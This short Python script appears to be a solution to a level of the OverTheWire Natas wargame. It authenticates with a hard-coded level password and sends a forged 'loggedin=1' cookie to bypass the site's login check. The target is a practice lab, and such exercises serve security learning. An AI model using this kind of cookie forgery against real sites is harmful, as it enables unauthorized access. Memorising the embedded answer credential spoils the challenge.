import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

cookies = { "loggedin" : "1" }

url = 'http://%s.natas.labs.overthewire.org'  % username

response = requests.get(url, auth = (username, password), cookies = cookies)
print(response.text)